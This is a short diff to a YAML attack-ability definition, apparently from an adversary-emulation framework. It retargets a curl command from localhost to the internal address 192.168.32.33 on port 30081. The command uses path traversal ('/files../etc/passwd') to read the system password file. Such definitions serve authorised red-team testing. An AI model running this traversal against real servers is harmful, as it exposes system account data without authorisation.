@@ -6,7 +6,7 @@
   executors:
   - name: sh
     platform: linux
-    command: curl http://localhost:#{host.port.8081}/files../etc/passwd;
+    command: curl http://192.168.32.33:#{host.port.30081}/files../etc/passwd;
     code: null
     language: null
     build_target: null
@@ -26,7 +26,7 @@
   requirements:
   - module: plugins.stockpile.app.requirements.paw_provenance
     relationship_match:
-    - source: host.port.8081
+    - source: host.port.30081
       edge: ''
       target: ''
   privilege: ''
